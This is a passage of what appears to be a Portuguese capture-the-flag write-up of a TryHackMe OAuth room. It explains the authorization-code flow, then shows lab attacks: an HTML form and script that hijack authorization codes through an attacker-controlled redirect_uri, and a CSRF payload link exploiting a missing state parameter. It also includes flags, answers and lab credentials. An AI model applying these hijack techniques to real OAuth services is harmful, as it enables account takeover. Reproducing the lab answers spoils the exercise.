+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://coffee.thm:8000/o/authorize/?client_id=</span><span style="color:#e6db74">{</span>app<span style="color:#f92672">.</span>client_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;response_type=code&amp;redirect_uri=</span><span style="color:#e6db74">{</span>redirect_uri<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> 
+</span></span><span style="display:flex;"><span>	) 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(authorization_url)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="autenticando-e-autorizando">Autenticando e autorizando<span class="hx:absolute hx:-mt-20" id="autenticando-e-autorizando"></span>
+    <a href="#autenticando-e-autorizando" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Quando usuário alcança o servidor de autorização é solicitado suas credenciais, após verificações, é mostrado ao usuário quais são as permissões que o <code>bistro app</code>está solicitando.</p>
+<p><img src="/assets/img/posts/2025/02/auth/server_permissions.png" alt="server Permissions"  loading="lazy" /></p>
+<h3 data-hextra-search-id="resposta-de-autorização">Resposta de autorização<span class="hx:absolute hx:-mt-20" id="resposta-de-autorização"></span>
+    <a href="#resposta-de-autoriza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Após o usuário conceder o acesso, é gerado um código, o usuário é redirecionado para a página do <code>bistro app</code>, juntamente com esse código.</p>
+<p><img src="/assets/img/posts/2025/02/auth/network_dev_tools_web.png" alt="webtools"  loading="lazy" /></p>
+<p>Após obter o código de autorização o <code>bistro app</code> solicita o token de acesso para o servidor de autorização.</p>
+<h3 data-hextra-search-id="token-de-acesso-1">Token de acesso<span class="hx:absolute hx:-mt-20" id="token-de-acesso-1"></span>
+    <a href="#token-de-acesso-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Bistro troca o código de autorização por um token de acesso através de uma requisição <code>POST</code> ao <em>endpoint</em> do servidor de autorização, utilizando os seguintes parâmetros.</p>
+<ul>
+<li><code>grant_type</code>: tipo de concessão que está sendo usado, é definido um <code>code</code>para especificar o código de autorização como o tipo de concessão.</li>
+<li><code>code</code>: código de autorização recebido do servidor de autorização.</li>
+<li><code>redirect_uri</code>: deve corresponder com URI original fornecida na requisição de autorização.</li>
+<li><code>client_id and client_secret</code>: credenciais para autenticação do aplicativo cliente.</li>
+</ul>
+<p>Exemplo de código fornecido na aula, utilizando os parâmetros acima.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://coffee.thm:8000/o/token/&#34;</span> 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	client_id <span style="color:#f92672">=</span> Application<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CoffeeApp&#34;</span>)<span style="color:#f92672">.</span>client_id 
+</span></span><span style="display:flex;"><span>	client_secret <span style="color:#f92672">=</span> Application<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CoffeeApp&#34;</span>)<span style="color:#f92672">.</span>client_secret 
+</span></span><span style="display:flex;"><span>	redirect_uri <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;redirect_uri&#34;</span>, <span style="color:#e6db74">&#34;http://bistro.thm:8000/oauthdemo/callback&#34;</span>)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> { 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;grant_type&#34;</span>: <span style="color:#e6db74">&#34;authorization_code&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;code&#34;</span>: code, 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;redirect_uri&#34;</span>: redirect_uri, 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;client_id&#34;</span>: client_id, 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;client_secret&#34;</span>: client_secret, 
+</span></span><span style="display:flex;"><span>		} 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	headers <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+</span></span><span style="display:flex;"><span>	 <span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Basic </span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>client_id<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>client_secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, 
+</span></span><span style="display:flex;"><span>	 } 
+</span></span><span style="display:flex;"><span>	 
+</span></span><span style="display:flex;"><span>	 response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(token_url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers) tokens <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Abaixo formato da requisição enviada pelo navegador.</p>
+<p><img src="/assets/img/posts/2025/02/auth/request_web_tools.png" alt="request"  loading="lazy" /></p>
+<h3 data-hextra-search-id="resposta-do-token">Resposta do token<span class="hx:absolute hx:-mt-20" id="resposta-do-token"></span>
+    <a href="#resposta-do-token" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O servidor de autorização autentica o site do bistrô e valida o código de autorização. Após a validação bem-sucedida, o servidor responde com um <code>Access Token</code> e opcionalmente com um <code>Refresh token</code>.</p>
+<p>Os campos que são incluídos na resposta do servidor de autorização.</p>
+<ul>
+<li><code>access_token</code></li>
+<li><code>token_type</code></li>
+<li><code>expires_in</code></li>
+<li><code>refresh_token (optional)</code></li>
+</ul>
+<p>Com isso o <code>bistro app</code>pode realizar requisições autenticadas no servidor de recursos do <code>CoffeShopApp</code>, em nome do usuário.</p>
+<p><strong>What is the cliend_id value after initiating the OAuth 2.0 workflow?</strong>
+Respota: <code>zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt</code></p>
+<p><strong>What parameter name determines the time validity of a token in the token response?</strong><br>
+Resposta:<code>expires_in</code></p>
+<h2 data-hextra-search-id="identificando-serviços-de-oauth">Identificando serviços de OAuth<span class="hx:absolute hx:-mt-20" id="identificando-serviços-de-oauth"></span>
+    <a href="#identificando-servi%c3%a7os-de-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>A primeira indicação de que um serviço utiliza OAuth pode ser observada em seu processo de login, onde são fornecidos serviços externos para realizar a autenticação, como por exemplo: Google, Facebook e GitHub. Esses serviços nos redirecionam para a página de autorização deles.</p>
+<h3 data-hextra-search-id="implementações-de-oauth">Implementações de OAuth<span class="hx:absolute hx:-mt-20" id="implementações-de-oauth"></span>
+    <a href="#implementa%c3%a7%c3%b5es-de-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Analisando o tráfego de rede do processo de login, devemos prestar atenção nos redirecionamentos HTTP. O OAuth geralmente redireciona o navegador para a URL do servidor de autorização.</p>
+<p>Essa URL frequentemente contém parâmetros específicos de consultas, como por exemplo.</p>
+<ul>
+<li><code>response_type</code></li>
+<li><code>client_id</code></li>
+<li><code>redirect_uri</code></li>
+<li><code>scope</code></li>
+<li><code>state</code></li>
+</ul>
+<p>Exemplo de URL</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>https://dev.coffee.thm/authorize?response_type=code&amp;client_id=AppClientID&amp;redirect_uri=https://dev.coffee.thm/callback&amp;scope=profile&amp;state=xyzSecure123</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="framework-oauth">Framework OAuth<span class="hx:absolute hx:-mt-20" id="framework-oauth"></span>
+    <a href="#framework-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O próximo passo é identificar o framework ou a biblioteca específica que o aplicativo emprega. Isso pode fornecer informações valiosas para a descoberta de vulnerabilidades e para realizar uma avaliação de segurança apropriada. Aqui estão algumas estratégias para identificar o framework:</p>
+<ul>
+<li>
+<p><code>Cabeçalhos HTTP e respostas</code>: Inspecionar cabeçalhos HTTP e o corpo das respostas, buscando comentários que especifiquem bibliotecas ou frameworks.</p>
+</li>
+<li>
+<p><code>Análise do código fonte</code>: Caso tenha acesso ao código fonte, buscar por palavras-chave ou bibliotecas.</p>
+</li>
+<li>
+<p><code>Autorização e token do endpoint</code>: Analisar os endpoints usados para obter códigos de autorização e tokens de acesso. Diferentes implementações de OAuth podem ter padrões ou estruturas de endpoint exclusivos.</p>
+</li>
+<li>
+<p><code>Mensagens de erro</code>: Mensagens de erro personalizadas e saídas de depuração podem revelar inadvertidamente a pilha de tecnologia subjacente.</p>
+</li>
+</ul>
+<p><strong>What is the name of the toolkit used for implementing Oauth in the URL <code>http://coffee.thm:8000/</code>?</strong></p>
+<p>Sabemos que a aplicação está utilizando Django para implementar OAuth, na aula já é fornecido a resposta, e também podemos encontra-la facilmente realizando uma pesquisa na internet.<br>
+Resposta:<code>django-oauth-toolkit</code></p>
+<h2 data-hextra-search-id="roubando-token-oauth">Roubando Token OAuth<span class="hx:absolute hx:-mt-20" id="roubando-token-oauth"></span>
+    <a href="#roubando-token-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>O token possui um papel crucial para proteger os recursos. Conforme mencionado, ele é emitido pelo servidor de autorização e redirecionado para a aplicação cliente através do parâmetro <code>redirect_uri</code>. Esse parâmetro, no entanto, nem sempre é bem protegido. Por meio dele, é possível realizar um ataque de <code>hijack tokens</code>.</p>
+<h3 data-hextra-search-id="papel-do-redirect_uri">Papel do Redirect_uri<span class="hx:absolute hx:-mt-20" id="papel-do-redirect_uri"></span>
+    <a href="#papel-do-redirect_uri" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><code>Redirect_uri</code> é um parâmetro específico no fluxo do OAuth. A URI desse parâmetro deve ser pré-registrada na aplicação, prevenindo assim vulnerabilidades no redirecionamento. Durante o processo de autenticação, o servidor verifica o valor fornecido pelo <code>redirect_uri</code> e garante que ele corresponde às URIs registradas.</p>
+<h3 data-hextra-search-id="vulnerabilidade">Vulnerabilidade<span class="hx:absolute hx:-mt-20" id="vulnerabilidade"></span>
+    <a href="#vulnerabilidade" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Um <code>redirect_uri</code> inseguro pode levar a falhas de segurança graves. Por exemplo, se o atacante ganhar controle sobre um domínio ou URL listada no parâmetro, ele pode interceptar o código de autorização e, assim, solicitar um token de acesso.</p>
+<p>Utilizaremos o exemplo a seguir, fornecido em aula, para entender melhor o conceito.</p>
+<h3 data-hextra-search-id="realizando-ataque">Realizando ataque<span class="hx:absolute hx:-mt-20" id="realizando-ataque"></span>
+    <a href="#realizando-ataque" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>No <code>CoffeShopApp</code>temos as seguintes URIs registradas.</p>
+<p><img src="/assets/img/posts/2025/02/auth/URI_registers.png" alt="URI_registers"  loading="lazy" /></p>
+<p>No exemplo, o atacante toma controle do domínio <code>dev.bistro.thm</code> e consegue hospedar qualquer página HTML no servidor. Sendo assim, o atacante cria a página abaixo, onde há um link escondido que será enviado no parâmetro <code>redirect_uri</code></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://coffee.thm:8000/oauthdemo/oauth_login/&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redirect_uri&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://dev.bistro.thm:8002/malicious_redirect.html&#34;</span>&gt; &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Hijack OAuth&#34;</span>&gt; 
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Será enviado o link <code>http://dev.bistro.thm:8002/malicious_redirect.html</code>, em nosso parâmetro <code>redirect_uri</code>.</p>
+<p><img src="/assets/img/posts/2025/02/auth/bistro_malicious.png" alt="bistro_malicious"  loading="lazy" /></p>
+<p>Após a vítima clicar em &ldquo;Login via OAuth&rdquo;, será feita uma requisição para o link do <code>CoffeShopApp</code>. A vítima então fornecerá suas credenciais para o servidor de autorização, que as verificará e, em seguida, redirecionará para a URI pré-registrada no servidor: <code>http://dev.bistro.thm:8002/malicious_redirect.html</code>.</p>
+<p>A página maliciosa realiza um parse na requisição, buscando o código de autorização e salvando-o em um banco de dados. Código abaixo</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Extract the authorization code from the URL 
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">urlParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">urlParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;code&#39;</span>); 
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;auth_code&#39;</span>).<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">code</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Intercepted Authorization Code:&#34;</span>, <span style="color:#a6e22e">code</span>); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// code to save the acquired code in database/file etc &lt;/script&gt;
+</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Após nos autenticar em <code>CoffeShopApp</code>e autorizar, somos redirecionados, e obtemos o código de autorização.</p>
+<p><img src="/assets/img/posts/2025/02/auth/cod_auth.png" alt="code_auth"  loading="lazy" /></p>
+<p>O endpoint <code>/callback</code> sempre está disponível. Com o código de autorização em mãos, podemos solicitar um token de acesso.</p>
+<p><strong>Endpoint:</strong> <code>http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx</code></p>
+<p><strong>Nosso código:</strong> <code>Mra1NAHSQyndd9M4vPfi1n4qFUubCf</code></p>
+<p><img src="/assets/img/posts/2025/02/auth/callback.png" alt="callback"  loading="lazy" /></p>
+<p><strong>What is the flag value after getting the access token?</strong><br>
+Reposta:<code>THM{GOT_THE_TOKEN007}</code></p>
+<h2 data-hextra-search-id="csrf-no-oauth">CSRF no OAuth<span class="hx:absolute hx:-mt-20" id="csrf-no-oauth"></span>
+    <a href="#csrf-no-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>O parâmetro <code>state</code>protege contra ataca de CSRF, no qual ocorre quando um atacante induz o usuário a executar uma ação desnecessária, o ataque a CSRF leva a um acesso não autorizado aos recursos e pode comprometer o fluxo do OAuth. O <code>state</code> ajuda a mitigar esses ataques, mantendo a integridade no processo de autorização.</p>
+<h3 data-hextra-search-id="fraqueza-ou-falta-do-parâmetro">Fraqueza ou falta do parâmetro<span class="hx:absolute hx:-mt-20" id="fraqueza-ou-falta-do-parâmetro"></span>
+    <a href="#fraqueza-ou-falta-do-par%c3%a2metro" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O parâmetro <code>state</code>é uma string arbitrária, está incluída na requisição feita pela aplicação cliente, quando o servidor de autorização recebe a requisição, é verificado as credenciais e é redirecionado de volta para aplicação cliente, o código de autorização junto com o parâmetro <code>state</code>. O cliente verifica se corresponde o valor no parâmetro que foi inicialmente enviado, esse processo de validação garante que a resposta é legítima no fluxo do OAuth.</p>
+<p>A vulnerabilidade ocorre quando há a falta do parâmetro, valor fixo ou uma sequência de número de fácil adivinhação. O atacante pode redirecionar o usuário para o domínio que está sob controle, depois que ele efetuar a autenticação e autorização no servidor de autorização.</p>
+<h3 data-hextra-search-id="prática">Prática<span class="hx:absolute hx:-mt-20" id="prática"></span>
+    <a href="#pr%c3%a1tica" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Nessa prática será explorada a ausência do parâmetro, primeiro faremos na perspectiva do atacante. Acessando a URL abaixo, realizamos o sincronismo de contas com o <code>CoffeShopApp</code>, iremos utilizar as credenciais de atacante: <code>attacker:attacker</code>.</p>
+<p>Link:<code>http://mycontacts.thm:8080/csrf/index.php</code></p>
+<p>Após autenticado clicamos em &ldquo;Sync Contacts&rdquo; , somos redirecionado para <code>coffe.thm</code>, analisando a URL identificamos que não possui o parâmetro <code>state</code>.</p>
+<p><img src="/assets/img/posts/2025/02/auth/get_syn_contacts.png" alt="get_sync"  loading="lazy" /></p>
+<h4 data-hextra-search-id="resumo-do-ataque">Resumo do ataque:<span class="hx:absolute hx:-mt-20" id="resumo-do-ataque"></span>
+    <a href="#resumo-do-ataque" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><ol>
+<li>
+<p><strong>Login como Atacante:</strong> Você usa as credenciais do atacante para obter seu próprio código de autorização.</p>
+</li>
+<li>
+<p><strong>Preparo do Payload:</strong> Com esse código de autorização, você prepara um payload malicioso.</p>
+</li>
+<li>
+<p><strong>Envio à Vítima:</strong> A vítima, ao clicar no link malicioso, associa a conta OAuth dela à conta do atacante.</p>
+</li>
+</ol>
+<h4 data-hextra-search-id="ataque">Ataque<span class="hx:absolute hx:-mt-20" id="ataque"></span>
+    <a href="#ataque" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Acessamos o link abaixo, utilizando as credenciais: <code>attacker:tesla@123</code></p>
+<p><strong>Link</strong>: <code>http://coffee.thm:8000/o/authorize/?response_type=code&amp;client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&amp;redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/</code></p>
+<p>Obtemos o código de autorização do atacante.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;code&#34;</span>: <span style="color:#e6db74">&#34;oudFyfzhrfgYwNQtbvnUwKY9fXlRNg&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;Payload&#34;</span>: <span style="color:#e6db74">&#34;http://bistro.thm:8080/csrf/callbackcsrf.php?code=oudFyfzhrfgYwNQtbvnUwKY9fXlRNg&#34;</span>
+</span></span><span style="display:flex;"><span>	}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Com o payload preparado, enviamos para vítima, podemos realizar um ataque de <em>phising</em> para o envio. Após a vítima clicar no link será solicitada suas credenciais, e após fornece-las a conta da vítima será vinculada a conta do atacante. Sem o parâmetro <code>state</code>, o servidor de autorização não consegue determinar se a solicitação de autorização é legítima ou maliciosa, demonstrando como a ausência do parâmetro <code>state</code> pode ser explorada para ataques CSRF em fluxos OAuth. Abaixo a visão da vítima após autenticar.</p>
+<p><img src="/assets/img/posts/2025/02/auth/sync_flag.png" alt="sync_flag"  loading="lazy" /></p>
+<p><strong>What is the flag value after attaching the attacker&rsquo;s account with the victim&rsquo;s account?</strong><br>
+Resposta:<code>THM{CONTACTS_SYNCED}</code></p>
+<p><strong>What parameter name does the client application include in the authorization request to avoid CSRF attacks?</strong><br>
+Resposta:<code>state</code></p>
+<h2 data-hextra-search-id="fluxo-de-concessão-implícita">Fluxo de Concessão Implícita<span class="hx:absolute hx:-mt-20" id="fluxo-de-concessão-implícita"></span>
+    <a href="#fluxo-de-concess%c3%a3o-impl%c3%adcita" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>É enviado diretamente para o cliente, sem a necessidade de um código de autorização. É usado principalmente por aplicações <em>single-page</em> e desenhado para clientes públicos que não conseguem armazenar com segurança os <em>client secrets</em>.</p>
+<p>As fraquezas são:</p>
+<ul>
+<li>Exposição do token de acesso na URL</li>
+<li>Inadequada validação do redirecionamento de URIs.</li>
+<li>Ausência na implementação de HTTPS.</li>
+<li>Inadequado manuseio do token de acesso.</li>
+</ul>
+<h3 data-hextra-search-id="prática-1">Prática<span class="hx:absolute hx:-mt-20" id="prática-1"></span>
+    <a href="#pr%c3%a1tica-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O usuário acessa <code>http://factbook.thm:8080</code>, está página permite que o usuário sincronize todos os seus status de <code>CoffeShoApp</code>. Clicando no botão &ldquo;<strong>Sync Statuses from CoffeeShopApp</strong>&rdquo; o processo é iniciado, o usuário é redirecionado para <code>CoffeShopApp</code>onde irá se autenticar com as credenciais: <code>victim:victim123</code>.
+Após isso, é feito a concessão implícita o usuário é redirecionado de volta para <code>factbook</code>, o token de acesso se encontra na URL.</p>
+<p><img src="/assets/img/posts/2025/02/auth/get_callback.png" alt="get_callback"  loading="lazy" /></p>
+<p>A página onde o usuário realiza a postagem de status é vulnerável a XSS.
+Na perspectiva do atacante, essa vulnerabilidade é explorada,  injetando o código malicioso, exemplo fornecido em aula.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
